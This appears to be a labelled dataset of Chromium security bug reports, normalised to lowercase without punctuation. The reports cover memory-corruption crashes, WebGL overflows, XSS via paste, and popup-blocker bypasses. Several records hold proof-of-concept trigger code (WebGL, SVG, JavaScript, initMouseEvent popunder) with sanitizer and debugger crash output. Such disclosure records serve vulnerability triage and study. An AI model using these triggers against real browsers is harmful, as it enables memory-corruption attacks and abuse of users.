75bd339a chrome_55190000 threadstartex void ptd f dd\vctools\crt_bld\self_x86\crt\src\threadex.c 292 0493fa90 77a09ef2 kernel32 basethreadinitthunk 0493fad0 77a09ec5 ntdll_779d0000 rtluserthreadstart 0493fae8 00000000 ntdll_779d0000 rtluserthreadstart 0:009 x86 dv ut start 0n-9 limit 0n6 dest destcapacity 0n16 perrorcode limit32 0n6 strlength 0n-1	11
security webgl after running out of memory buffer can still be written vulnerability details when the gpu process runs out of memory a webgl buffer is destroyed calling gl.buffersubdata gl.array_buffer lolbuf will still attempt to write to the buffer fwiw i have 8 gigs of ram on this computer for asan a good value for medium number is 2^29 for regular build under crashwrangler 2^30 is more appropriate but reloading a few times will crash the regular browser with 2^29 as well version chrome version stable dev operating system osx 10.8 64bit mountain lion reproduction case html head script gl=document.createelement canvas getcontext experimental-webgl var mediumnumber math.pow 2,29 var lolbuf new uint8array gl.bindbuffer gl.array_buffer gl.createbuffer gl.bufferdata gl.array_buffer lolbuf gl.static_draw gl.bufferdata gl.array_buffer mediumnumber gl.static_draw gl.bindbuffer gl.array_buffer gl.createbuffer gl.bufferdata gl.array_buffer lolbuf gl.static_draw gl.bufferdata gl.array_buffer mediumnumber gl.static_draw gl.buffersubdata gl.array_buffer lolbuf script head html for crashes please include the following additional information type of crash gpu process crash state 4502 1402541528:0917/130445 error gles2_cmd_decoder.cc 5191 webglrenderingcontext gl error gl_out_of_memory asan sigsegv 4502 error addresssanitizer crashed on unknown address pc sp bp t0 addresssanitizer can not provide additional info 0 in memmove variant sse42 in libsystem_c.dylib 86 1 in glbuffersubdata_exec in glengine 860 2 in glbuffersubdata in libgl.dylib 51 3 in gpu gles2 gles2decoderimpl dobuffersubdata unsigned int long long void const in chromium framework 705 exception=exc_bad_access signal=10 is_exploitable=yes instruction_disassembly=movb al edi instruction_address access_type=write access_address crash accessing invalid address consider running it again with libgmalloc 3 to see if the log changes crashed thread 0 crgpumain dispatch queue com.apple.main-thread exception type exc_bad_access sigbus exception codes kern_protection_failure at thread 0 crashed crgpumain dispatch queue com.apple.main-thread 0 libsystem_c.dylib memmove variant sse42 87 1 glengine glbuffersubdata_exec 861 2 libgl.dylib glbuffersubdata 52 eax ebx ecx edx edi esi ebp esp	11
heap-use-after-free in webcore graphicscontext restore vulnerability details use-after-free in webcore graphicscontext restore version chrome version stable beta dev operating system linux 64bit precise reproduction case html head style style script onload function el0=document.createelementns svg el0.setattribute id el0 document.body.appendchild el0 el1=document.createelementns filter el1.setattribute id el1 el0.appendchild el1 el2=document.createelementns feimage el1.appendchild el2 document.body.offsettop el0.setattribute filter url el1 el2.setattributens xlink href el0 script head body body html for crashes please include the following additional information type of crash renderer asan crash state 12607 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 1 at thread t0 0 in webcore graphicscontext restore 0 1 in webcore rendersvgroot paintreplaced webcore paintinfo webcore fractionallayoutpoint const 0 2 in webcore renderreplaced paint webcore paintinfo webcore fractionallayoutpoint const 0 is located 108 bytes inside of 144-byte region freed by thread t0 here 0 in interceptor_free 0 1 in webcore imagebuffer imagebuffer 0 2 in webcore filtereffect filtereffect 0 3 in webcore feimage feimage 0	11
security/privacy img embedded svg will load external content referenced by css import font-face vulnerability details if svg are embedded using an img tag like in gmail multipart mime messages they should not load external content however css embedded in a svg will load import and font-face urls version chrome version version 22.0.1229.14 beta operating system linux reproduction case open attached file in chrome do n't rely on chrome s network inspector use tcpdump to check for the font-face and import request	2
security integer overflow in webgl on osx vulnerability details integer overflow in webgl on osx version chrome version stable dev operating system 64bit osx mountain lion 10.8 reproduction case html head script onload function var gl document.createelement canvas getcontext experimental-webgl gl.bindbuffer gl.element_array_buffer gl.createbuffer gl.bufferdata gl.element_array_buffer new uint8array 1 gl.static_draw var magic gl.buffersubdata gl.element_array_buffer math.pow 2,31 magic new uint8array magic gl.buffersubdata gl.element_array_buffer 1 new uint8array magic/2 script head html for crashes please include the following additional information type of crash gpu crash state 37314 error addresssanitizer crashed on unknown address pc sp bp t0 addresssanitizer can not provide additional info 0 in memmove variant sse42 in libsystem_c.dylib 217 1 in gpu gles2 buffermanager bufferinfo setrange long long void const in chromium framework 306 2 in gpu gles2 gles2decoderimpl dobuffersubdata unsigned int long long void const in chromium framework 317 exception=exc_bad_access signal=11 is_exploitable=yes instruction_disassembly=movdqa xmm0 edi edx instruction_address access_type=write access_address exception type exc_bad_access sigsegv exception codes kern_invalid_address at thread 0 crashed crgpumain dispatch queue com.apple.main-thread 0 libsystem_c.dylib memmove variant sse42 218	9
heap-buffer-overflow in skaaclipblitter blitantih repro-file as attachment chromium 23.0.1263.0 developer build 155968 asan-report 5702 error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 1 at thread t0 0 in skaaclipblitter blitantih int int unsigned char const short const 0 1 in vertish int int int int skblitter int third_party/skia/src/core/skscan_antihair.cpp:0 2 in do_anti_hairline int int int int skirect const skblitter third_party/skia/src/core/skscan_antihair.cpp:0 3 in skscan antihairlinergn skpoint const skpoint const skregion const skblitter 0 4 in hair_path skpath const skrasterclip const skblitter void skpoint const skpoint const skregion const skblitter third_party/skia/src/core/skscan_hairline.cpp:0 5 in skdraw drawpath skpath const skpaint const skmatrix const bool const 0 6 in skcanvas drawpath skpath const skpaint const 0 7 in ui nativethemebase paintarrowbutton skcanvas gfx rect const ui nativetheme part ui nativetheme state const 0 8 in ui nativethemebase paint skcanvas ui nativetheme part ui nativetheme state gfx rect const ui nativetheme extraparams const const 0 9 in webkit_glue webthemeengineimpl paint skcanvas webkit webthemeengine part webkit webthemeengine state webkit webrect const webkit webthemeengine extraparams const 0 10 in webcore platformsupport paintthemepart webcore graphicscontext webcore platformsupport themepart webcore platformsupport themepaintstate webcore intrect const webcore platformsupport themepaintextraparams const 0	7
security chrome extension dep crash originally reported by tom nielsen video at version chrome version 22.0.1229.14 the following extension source triggers the issue var glasttabid 0 var gtimeoutid 0 function timeoutwatchfortabchange chrome.tabs.getselected null function tab if glasttabid 0 tab.id glasttabid handleclosepopup gtimeoutid 0 glasttabid 0 return check for tab to change again gtimeoutid window.settimeout timeoutwatchfortabchange 200 closes our popup window function handleclosepopup remove popup by selecting the tab chrome.tabs.getselected null function tab console.log closing tab chrome.tabs.update tab.id selected true window.onload function timeoutwatchfortabchange document.getelementbyid mainbody addeventlistener dragleave handleclosepopup false	9
security world-writable shared memory segments for x/linux ui ui/surface/transport_dib_linux.cc and ui/base/x/x11_util.cc create shared memory segments that have mode 0666 ui/surface/transport_dib_linux.cc has the comment transportdib transportdib create size_t size uint32 sequence_num we use a mode of 0666 since the x server wo n't attach to memory which is 0600 since it ca n't know if it as a root process is being asked to map someone else s private shared memory region const int shmkey shmget ipc_private size 0666 but that comment does not appear to be true anymore i changed the mode the 0600 and added a dlog warning telling me if shmkey worked and it did and chrome appears to run normally ccing agl since he wrote the shmget calls in both files i ve got a trivial patch that i ll post momentarily	2
security copy-paste preserves embed tags containing active content vulnerability details copying an html snippet that includes an embed tag and then pasting into a content-editable div box e.g gmail compose area can result in xss on the pastee host page credit this was originally reported to google security by subho halder aditya gupta and dev kar of xys3c xysec.com version chrome version 17.0.963.44 beta operating system ubuntu 10.04 reproduction case matthew/misc/copy-paste-xss this also works across if the contenteditable div is within a page in a different origin	9
gpuprocesshost check channel_requests_.empty code from gpuprocesshost onchannelestablished establishchannelcallback callback channel_requests_.front callback.run channel_handle gpudatamanagerimpl getinstance getgpuinfo compromised gpu process could send an unsolicited gpuhostmsg_channelestablished so channel_requests is empty the called function pointer comes from garbage first meaningful bug found by the ipc fuzzer yay reproduction case repro.patch is attached it makes the gpu process send gpuhostmsg_channelestablished twice i added some allocations to gpuprocesshost to show how the function pointer depends on previous allocations	11
heap-use-after-free in cricket webrtcrenderadapter framesizechange detailed report fuzzer phoglund_webrtc_peerconnection crash type heap-use-after-free read 8 crash address crash state crash stack cricket webrtcrenderadapter deliverframe webrtc vieexternalrendererimpl renderframe free stack talk_base refcountedobject webrtc videotrack release webrtc videotrackproxy release_s regressed minimized testcase 16.58 kb additional requirements requires http	11
assertion failed ownerelement contentframe frame ownerelement contentframe heap-use-after-free in webcore node isdescendantof detailed report fuzzer bj_broddelwerk crash type heap-use-after-free read 4 crash address crash state crash stack webcore node isdescendantof webcore compositeeditcommand cloneparagraphundernewelement free stack webcore removenodecommand removenodecommand webcore compositeeditcommand compositeeditcommand regressed minimized testcase 7.85 kb	11
extensionfunctionregistry missing check for iter factories_.end code in extensionfunctionregistry newfunction extensionfunction extensionfunctionregistry newfunction const std string name factorymap iterator iter factories_.find name dcheck iter factories_.end extensionfunction function iter second.factory the dcheck is not enough because compromised renderer can fake a non-existent name so iter factories_.end and iter second.factory is called on linux the std map end points into the map object itself the 8 byte first std string will be the last 8 bytes of the map object and second is the garbage right after the map object which is interpreted as a function pointer and called the map is a field in extensionfunctionregistry which has a size of 56 bytes so it falls into 64 byte tcmalloc slot the pointer will be the last 8 bytes of the same slot so its value depends on what the previous user of the slot stored there reproduction case apply repro.patch compile run	11
heap-buffer-overflow in webcore inlineiterator attextparagraphseparator detailed report fuzzer inferno_twister_custom_bundle crash type heap-buffer-overflow read 2 crash address crash state crash stack webcore inlineiterator attextparagraphseparator webcore renderblock linebreaker nextsegmentbreak webcore renderblock linebreaker nextlinebreak minimized testcase 0.52 kb	11
assertion failed object object isbox unknown in webcore renderblock layoutblockchildren detailed report fuzzer marty_html_twiddler crash type unknown crash address crash state crash stack webcore renderblock layoutblockchildren webcore renderblock layoutblock webcore renderblock layout regressed minimized testcase 1.66 kb	11
heap-buffer-overflow in void media tointerleavedinternal int long detailed report fuzzer inferno_flicker crash type heap-buffer-overflow write 4 crash address crash state crash stack void media tointerleavedinternal int long media audiobus tointerleavedpartial media ffmpegaudiodecoder rundecodeloop minimized testcase 68.82 kb	11
assertion failed object object isrenderinline unknown in webcore rendertexttrackcue initializelayoutparameters detailed report fuzzer inferno_twister crash type unknown crash address crash state crash stack webcore rendertexttrackcue initializelayoutparameters webcore rendertexttrackcue repositioncuesnaptolinesset webcore rendertexttrackcue layout regressed minimized testcase 0.37 kb	11
clicking links using generated mouse events bypasses the popup blocker landed here	11
harden wtf vector operator this was originally considered under the webkit umbrella at but stalled due to jsc slowness the concept is trivial to land in a blink world as there is only v8 so i will do so once initial blink churn has settled down	11
another popunder scheme useragent mozilla/5.0 windows nt 5.1 applewebkit/537.31 khtml like gecko chrome/26.0.1410.43 safari/537.31 example url steps to reproduce the problem 1 open the attached reduced test case 2 click anywhere what is the expected behavior a popup window what went wrong a popunder window does it occur on multiple sites n/a is it a problem with a plugin no did this work before n/a does this work in other browsers n/a chrome version 26.0.1410.43 channel stable os version 5.1 windows xp the differentiating factor here is the true that sets the control key as pressed the tenth parameter of initmouseevent perhaps the meta key is for macintosh or something on windows it works with the first ten parameters replacing event.initmouseevent with the following also works event new mouseevent click ctrlkey true once this is fixed please merge into any current stable and beta release	11
potential use after free in applystylecommand splitancestorswithunicodebidi	11
tracking bug for internal security fixes for chrome 27 release 0 starting with chrome 27 we re doing security release notes more similarly to the firefox project we laud the external security contributions and rewards and de-emphasize internal work which is usually of less interest if internal work uncovered anything critical we d pull it out into the main section because it would be an item of interest chrome security bugs are rarely classified as critical due to the sandbox though so there are no such instances in this case this is just a forewarning that it s possible that internally discovered issues might be significant enough to appear in the main release notes section in the future this bug tracks as a list of internally fixed issues high high medium high medium low high high high low high high high low medium high high high high high medium high high high medium high low medium high medium high high low medium high medium medium high low high	11
heap-use-after-free in webcore idbdatabase oncomplete detailed report fuzzer inferno_twister crash type heap-use-after-free read 8 crash address crash state crash stack webcore idbdatabase oncomplete content indexeddbdispatcher oncomplete free stack v8 internal globalhandles node postgarbagecollectionprocessing v8 internal globalhandles postgarbagecollectionprocessing	11
heap-use-after-free in webcore rendertextcontrol visiblepositionforindex detailed report fuzzer inferno_twister crash type heap-use-after-free read 8 crash address crash state crash stack webcore rendertextcontrol visiblepositionforindex webcore htmltextformcontrolelement setselectionrange free stack webcore node detach webcore element detach regressed minimized testcase 0.52 kb	11
use-after-free on ipc channelproxy context onchannelerror this crash has been found by the last syzyasan canary 28.0.1477.2 error type read of size 4 alloc_stack 62 void alloc_stack_size free_stack 62 void free_stack_size error_type 1 use_after_free shadow_info 128 is located 171 bytes inside of 488-bytes region stack trace of the crash chrome content gpuchannelhost messagefilter onchannelerror c b\build\slave\win-asan\build\src\content\common\gpu\client\gpu_channel_host.cc 386 chrome ipc channelproxy context onchannelerror c b\build\slave\win-asan\build\src\ipc\ipc_channel_proxy.cc 130 chrome ipc channel channelimpl oniocompleted c b\build\slave\win-asan\build\src\ipc\ipc_channel_win.cc 456 chrome base messagepumpforio waitforiocompletion c b\build\slave\win-asan\build\src\base\message_pump_win.cc 588 chrome base messagepumpforio dorunloop c b\build\slave\win-asan\build\src\base\message_pump_win.cc 527 chrome base messagepumpwin run c b\build\slave\win-asan\build\src\base\message_pump_win.h 48 chrome base messageloop runinternal c b\build\slave\win-asan\build\src\base\message_loop.cc 432 chrome base runloop run c b\build\slave\win-asan\build\src\base\run_loop.cc 45 chrome base thread run c b\build\slave\win-asan\build\src\base\threading\thread.cc 152 chrome base thread threadmain c b\build\slave\win-asan\build\src\base\threading\thread.cc 197 chrome base anonymous namespace threadfunc c b\build\slave\win-asan\build\src\base\threading\platform_thread_win.cc 58 kernel32 basethreadinitthunk ntdll rtluserthreadstart ntdll rtluserthreadstart allocation stack trace asan_rtl agent asan heapproxy alloc e b\build\slave\syzygy_official\build\src\syzygy\agent\asan\asan_heap.cc 191 asan_rtl asan_heapalloc e b\build\slave\syzygy_official\build\src\syzygy\agent\asan\asan_rtl_impl.cc 100 chrome generic_cpp_alloc c b\build\slave\win-asan\build\src\base\allocator\generic_allocators.cc 16 chrome content renderermain c b\build\slave\win-asan\build\src\content\renderer\renderer_main.cc 197 chrome content runnamedprocesstypemain c b\build\slave\win-asan\build\src\content\app\content_main_runner.cc 431 chrome content contentmainrunnerimpl run c b\build\slave\win-asan\build\src\content\app\content_main_runner.cc 736 chrome content contentmain c b\build\slave\win-asan\build\src\content\app\content_main.cc 35 chrome chromemain c b\build\slave\win-asan\build\src\chrome\app\chrome_main.cc 28 chrome maindllloader launch c b\build\slave\win-asan\build\src\chrome\app\client_util.cc 445 chrome runchrome c b\build\slave\win-asan\build\src\chrome\app\chrome_exe_main_win.cc 32 free stack trace asan_rtl agent asan heapproxy free e b\build\slave\syzygy_official\build\src\syzygy\agent\asan\asan_heap.cc 232 asan_rtl asan_heapfree e b\build\slave\syzygy_official\build\src\syzygy\agent\asan\asan_rtl_impl.cc 128 chrome operator delete c b\build\slave\win-asan\build\src\base\allocator\allocator_shim.cc 157 chrome content renderthreadimpl scalar deleting destructor chrome stdext exception what perf chrome_52f40000 chrome content renderermain c b\build\slave\win-asan\build\src\content\renderer\renderer_main.cc 230 chrome content runnamedprocesstypemain c b\build\slave\win-asan\build\src\content\app\content_main_runner.cc 431 chrome content contentmainrunnerimpl run c b\build\slave\win-asan\build\src\content\app\content_main_runner.cc 736 chrome content contentmain c b\build\slave\win-asan\build\src\content\app\content_main.cc 35 chrome chromemain c b\build\slave\win-asan\build\src\chrome\app\chrome_main.cc 28 chrome maindllloader launch c b\build\slave\win-asan\build\src\chrome\app\client_util.cc 445 chrome runchrome c b\build\slave\win-asan\build\src\chrome\app\chrome_exe_main_win.cc 32	11
security template implementation fails to check for template in special list when handling any other end tag for in body this should get merged to m26 reproduction case listed in webkit bug for crashes please include the following additional information type of crash renderer	11
multiple ffmpeg security issues found by j00ru detailed report fuzzer inferno_flicker crash type heap-use-after-free read 1 crash address crash state crash stack ff_er_frame_end field_end free stack media releasedata base internal invokehelper false void base internal runnableadapter void minimized testcase 31.80 kb	11
unknown in webcore qualifiedname wtf hashtable webcore qualifiedname webcore qualifiedname wtf identity detailed report fuzzer inferno_twister crash type unknown crash address crash state crash stack webcore qualifiedname wtf hashtable webcore qualifiedname webcore qualifiedname wtf identity webcore iselementforformatblock webcore formatblockcommand formatrange regressed minimized testcase 1.29 kb	11
assertion failed m_table heap-use-after-free in wtf hashtable webcore svgelement const wtf keyvaluepair webcore svgelement const webcore sv tested on linux 195394 repro1.xml html xmlns script settimeout window.location.reload 1 script svg xmlns xmlns xlink set attributename font-weight set font font-face font-family any id foo font-face font use xlink href foo set attributename text-anchor set use svg html 17896==error addresssanitizer heap-use-after-free on address at pc bp sp write of size 8 at thread t21 chrome_inprocre 0 in constructdeletedvalue build/third_party/webkit/source/wtf/hashtraits.h:113 1 in remove build/third_party/webkit/source/wtf/hashtable.h:1033 2 in removewithoutentryconsistencycheck build/third_party/webkit/source/wtf/hashtable.h:1058 3 in remove build/third_party/webkit/source/wtf/hashmap.h:388 4 in svgelement build/third_party/webkit/source/core/svg/svgelement.cpp:81 5 in svguseelement build/third_party/webkit/source/core/svg/svguseelement.cpp:116 6 in svguseelement build/third_party/webkit/source/core/svg/svguseelement.cpp:112 7 in removedetachedchildrenincontainer webcore node webcore containernode build/third_party/webkit/source/core/dom/containernodealgorithms.h:104 8 in dispose build/third_party/webkit/source/core/dom/document.cpp:641 9 in removedlastreftoscope build/third_party/webkit/source/core/dom/node.cpp:2556 10 in postgarbagecollectionprocessing build/v8/src/global-handles.cc:277 11 in postgarbagecollectionprocessing build/v8/src/global-handles.cc:659 12 in performgarbagecollection build/v8/src/heap.cc:994 13 in collectgarbage build/v8/src/heap.cc:653 14 in collectgarbage build/v8/src/heap-inl.h:493 15 in collectallgarbage build/v8/src/heap.cc:564	11
langfuzz crash on heap with invalid read on dangerous possibly uninitialized address 64 bit useragent mozilla/5.0 x11 linux x86_64 rv:22.0 gecko/20130413 firefox/22.0 steps to reproduce the problem 1 run the following js code in the browser or d8 shell var new_space_string for var i 0 i 12800 i new_space_string string.fromcharcode math.random 26 4294967295 0 2 observe crash what is the expected behavior no crash what went wrong browser tab crashes program received signal sigsegv segmentation fault in gdb bt 0 in 16 in gdb x i pc mov rbx rax,8 rbx gdb info reg rbx rax rbx 67523539128817 rax 4294967300 valgrind trace for d8 24262 invalid read of size 8 24262 at 24262 by 24262 by 24262 by v8 internal invoke bool v8 internal handle v8 internal jsfunction v8 internal handle v8 internal object int v8 internal handle v8 internal object bool in v8-trunk/out/x64.release/d8 24262 by v8 internal execution call v8 internal handle v8 internal object v8 internal handle v8 internal object int v8 internal handle v8 internal object bool bool in v8-trunk/out/x64.release/d8 24262 by v8 script run in v8-trunk/out/x64.release/d8 24262 by v8 shell executestring v8 isolate v8 handle v8 string v8 handle v8 value bool bool in v8-trunk/out/x64.release/d8 24262 by v8 sourcegroup execute v8 isolate in v8-trunk/out/x64.release/d8 24262 by v8 shell runmain v8 isolate int char in v8-trunk/out/x64.release/d8 24262 by v8 shell main int char in v8-trunk/out/x64.release/d8 24262 by below main in lib64/libc-2.12.2.so 24262 address is not stack d malloc d or recently free d did this work before n/a chrome version 28.0.1485.0 channel dev os version ubuntu 12.10 the crash address keeps changing even in the shell i assume this could be another uninitialized pointer or something similar	11
security type confusion vulnerability in v8clipboard setdragimagemethodcustom vulnerability details a type confusion vulnerability exists in the code that handles setting drag images for draggable items the specified drag image is cast to an htmlimageelement without proper checks being performed to ensure that it is an html image element the check uses the node haslocalname function which operates on a qualifiedname to check that the localname tag name is img but does not check the namespaceuri of the qualifiedname object this allows an invalid e.g svg img element to pass the checks and an invalid cast occurs the vulnerable code is as follows src\third_party\webkit\source\bindings\v8\custom\v8clipboardcustom.cpp:100 if toelement node haslocalname htmlnames imgtag node indocument clipboard setdragimage static_cast htmlimageelement node cachedimage intpoint x y immediately after the cast is performed the cachedimage method is called on the invalid object which makes several virtual function calls on the object as the htmlimageelement s vtable is much larger than an unknown svgelement the adjacent memory is used as part of the vtable the values used vary from run to run but are often ascii text from part of a string it is speculated that these values could be controlled if the appropriate heap manipulation was performed before triggering the issue a suitable fix for this issue is to use the node hastagname function which checks both the localname and the namespaceuri inside the qualifiedname matches function version chrome version 26.0.1410.64 stable vulnerable code confirmed present in trunk operating system windows 8 pro reproduction case a minimised test case is attached to trigger the crash click and drag on the image for crashes please include the following additional information type of crash tab crash state c74.122c access violation code c0000005 first chance first chance exceptions are reported before any exception handling this exception may be expected and handled chrome_6f680000 webcore cachedresourcehandlebase setresource 6f833e33 ff873c030000 inc dword ptr edi+33ch ds:002b:7155753c=00000000 2:036 x86 r eax=71557200 ebx=042407e4 ecx=042407e4 edx=71557200 esi=00000000 edi=71557200 eip=6f833e33 esp=0080e1e0 ebp=0080e1fc iopl=0 nv up ei pl nz na pe nc cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00010206 chrome_6f680000 webcore cachedresourcehandlebase setresource 6f833e33 ff873c030000 inc dword ptr edi+33ch ds:002b:7155753c=00000000 2:036 x86 k l 10 childebp retaddr 0080e1fc 704262c4 chrome_6f680000 webcore cachedresourcehandlebase setresource 0080e210 70426341 chrome_6f680000 webcore clipboardchromium setdragimage 0080e228 7050d0b8 chrome_6f680000 webcore clipboardchromium setdragimage 0080e278 6f942b7e chrome_6f680000 webcore v8clipboard setdragimagecallback 0080e2e0 6f942904 chrome_6f680000 v8 internal handleapicallhelper 0 0080e3b4 6f8daa83 chrome_6f680000 v8 internal builtin_handleapicall 0080e404 6f8da933 chrome_6f680000 v8 internal invoke 0080e444 6f969305 chrome_6f680000 v8 internal execution call 0080e498 6faae768 chrome_6f680000 v8 function call 0080e4e8 6faae508 chrome_6f680000 webcore scriptcontroller callfunctionwithinstrumentation 0080e50c 704dd449 chrome_6f680000 webcore scriptcontroller callfunction 0080e530 6faad79e chrome_6f680000 webcore v8lazyeventlistener calllistenerfunction 0080e570 6faac418 chrome_6f680000 webcore v8abstracteventlistener invokeeventhandler 0080e5a8 6faac25c chrome_6f680000 webcore v8abstracteventlistener handleevent 0080e5d8 6f7c6883 chrome_6f680000 webcore eventtarget fireeventlisteners 0080e608 6f7c6bb1 chrome_6f680000 webcore eventtarget fireeventlisteners	9
heap-use-after-free in webkit_media webmediaplayerimpl paint vulnerability details the attached testcase crash.html crashes when loaded in the current asan chromium build unfortunately i was n't able to get rid of the dependencies svg1.svg and skeleton.ogv have to be placed in the same directory the asan output looks as follows 7500 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 chrome 0 in paint b/build/slave/asan_release__symbolized_/build/webkit/media/webmediaplayer_impl.cc:629 1 in paintcurrentframeincontext b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/webkit/chromium/src/webmediaplayerclientimpl.cpp:628 2 in paintreplaced b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/webcore/rendering/rendervideo.cpp:217 3 in paint b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/webcore/rendering/renderreplaced.cpp:158 4 in paint b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/webcore/rendering/renderimage.cpp:405 5 in paintforegroundforfragmentswithphase b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/webcore/rendering/renderlayer.cpp:4032 6 in paintforegroundforfragments b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/webcore/rendering/renderlayer.cpp:4008 7 in paintlayercontents b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/webcore/rendering/renderlayer.cpp:3736 8 in paintlayer b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/webcore/rendering/renderlayer.cpp:3538 9 in paintlist b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/webcore/rendering/renderlayer.cpp:3825 10 in paintlayercontents b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/webcore/rendering/renderlayer.cpp:3745 11 in paintlayer b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/webcore/rendering/renderlayer.cpp:3538 12 in paintlist b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/webcore/rendering/renderlayer.cpp:3825 13 in paintlayercontents b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/webcore/rendering/renderlayer.cpp:3748 14 in paintlayer b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/webcore/rendering/renderlayer.cpp:3538 15 in paint b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/webcore/rendering/renderlayer.cpp:3362 16 in paintcontents b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/webcore/page/frameview.cpp:3165 17 in paint b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/webcore/platform/scrollview.cpp:962 18 in paint b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/webkit/chromium/src/pagewidgetdelegate.cpp:97 19 in paint b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/webkit/chromium/src/webviewimpl.cpp:1888 20 in paintrect b/build/slave/asan_release__symbolized_/build/content/renderer/render_widget.cc:904 21 in dodeferredupdate b/build/slave/asan_release__symbolized_/build/content/renderer/render_widget.cc:1228 22 in dodeferredupdateandsendinputack b/build/slave/asan_release__symbolized_/build/content/renderer/render_widget.cc:1036 23 in invalidationcallback b/build/slave/asan_release__symbolized_/build/content/renderer/render_widget.cc:1032 24 in makeitso b/build/slave/asan_release__symbolized_/build/./base/bind_internal.h:871 25 in runtask b/build/slave/asan_release__symbolized_/build/base/message_loop.cc:474 26 in deferorrunpendingtask b/build/slave/asan_release__symbolized_/build/base/message_loop.cc:486 27 in dowork b/build/slave/asan_release__symbolized_/build/base/message_loop.cc:669 28 in run b/build/slave/asan_release__symbolized_/build/base/message_pump_default.cc:29 29 in runinternal b/build/slave/asan_release__symbolized_/build/base/message_loop.cc:431 30 in run b/build/slave/asan_release__symbolized_/build/base/run_loop.cc:45 31 in run b/build/slave/asan_release__symbolized_/build/base/message_loop.cc:311 32 in renderermain b/build/slave/asan_release__symbolized_/build/content/renderer/renderer_main.cc:226 33 in runzygote b/build/slave/asan_release__symbolized_/build/content/app/content_main_runner.cc:411 34 in runnamedprocesstypemain b/build/slave/asan_release__symbolized_/build/content/app/content_main_runner.cc:467 35 in run b/build/slave/asan_release__symbolized_/build/content/app/content_main_runner.cc:764 36 in contentmain b/build/slave/asan_release__symbolized_/build/content/app/content_main.cc:35 37 in chromemain b/build/slave/asan_release__symbolized_/build/chrome/app/chrome_main.cc:32 38 in main b/build/slave/asan_release__symbolized_/build/chrome/app/chrome_exe_main_gtk.cc:34 39 in libc_start_main build/buildd/eglibc-2.15/csu/libc-start.c:226 40 in start 0 is located 0 bytes inside of 456-byte region freed by thread t0 chrome here 0 in free 0 1 in frameloader b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/webcore/loader/frameloader.cpp:245 2 in frame b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/webcore/page/frame.cpp:210 3 in deref b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/wtf/wtf/refcounted.h:202 4 in derefifnotnull webcore frame b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/wtf/wtf/passrefptr.h:45 5 in frameview b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/webcore/page/frameview.cpp:225 6 in deallocatetable b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/wtf/wtf/hashtable.h:1089 7 in movewidgets b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/webcore/rendering/renderwidget.cpp:72 8 in widgethierarchyupdatessuspensionscope b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/webcore/rendering/renderwidget.h:41 9 in removechild b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/webcore/dom/containernode.cpp:518 10 in collectchildrenandremovefromoldparent b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/webcore/dom/containernode.cpp:81 11 in appendchild b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/webcore/dom/containernode.cpp:653 12 in appendchild b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/webcore/dom/node.cpp:574 13 in appendchildmethodcustom b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/bindings/v8/custom/v8nodecustom.cpp:116 14 in handleapicallhelper false b/build/slave/asan_release__symbolized_/build/v8/src/builtins.cc:1327 15 in 16 in 17 in 18 in 19 in 20 in invoke b/build/slave/asan_release__symbolized_/build/v8/src/execution.cc:118 21 in run b/build/slave/asan_release__symbolized_/build/v8/src/api.cc:1815 22 in runcompiledscript b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/bindings/v8/scriptrunner.cpp:52 23 in compileandrunscript b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/bindings/v8/scriptcontroller.cpp:288 24 in execute b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/bindings/v8/scheduledaction.cpp:109 25 in fired b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/webcore/page/domtimer.cpp:141 26 in sharedtimerfiredinternal b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/webcore/platform/threadtimers.cpp:129 27 in makeitso b/build/slave/asan_release__symbolized_/build/./base/bind_internal.h:871 28 in run b/build/slave/asan_release__symbolized_/build/./base/bind_internal.h:1173 29 in runscheduledtask b/build/slave/asan_release__symbolized_/build/base/timer.cc:181 previously allocated by thread t0 chrome here 0 in malloc 0 1 in fastmalloc b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/wtf/wtf/fastmalloc.cpp:280 2 in createchildframe b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/webkit/chromium/src/webframeimpl.cpp:2167 3 in createframe b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/webkit/chromium/src/frameloaderclientimpl.cpp:1464 4 in loadsubframe b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/webcore/loader/subframeloader.cpp:260 5 in loadorredirectsubframe b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/webcore/loader/subframeloader.cpp:234 6 in requestframe b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/webcore/loader/subframeloader.cpp:83 